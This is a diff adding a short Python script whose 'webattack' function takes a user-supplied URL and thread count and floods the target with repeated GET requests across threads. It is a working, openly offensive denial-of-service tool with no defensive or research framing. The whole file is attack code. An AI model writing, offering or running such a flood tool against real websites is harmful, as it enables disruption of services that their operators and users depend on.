@@ -1,0 +1,38 @@
+import colorama
+import threading
+import requests
+
+def webattack():
+    def dos(target):
+        for o in range(100):
+            try:
+                res = requests.get(target)
+                print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
+            except requests.exceptions.ConnectionError:
+                print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
+            o += 1
+            if o == 100:
+                exit()
+
+    threads = 20
+
+    url = input("URL: ")
+
+    try:
+        threads = int(input("Threads: "))
+    except ValueError:
+        exit("Threads count is incorrect!")
+
+    if threads == 0:
+        exit("Threads count is incorrect!")
+
+    if not url.__contains__("http"):
+        exit("URL doesnt contains http or https!")
+
+    if not url.__contains__("."):
+        exit("Invalid domain")
+
+    for i in range(0, threads):
+        thr = threading.Thread(target=dos, args=(url,))
+        thr.start()
+        print(str(i + 1) + " thread started!")
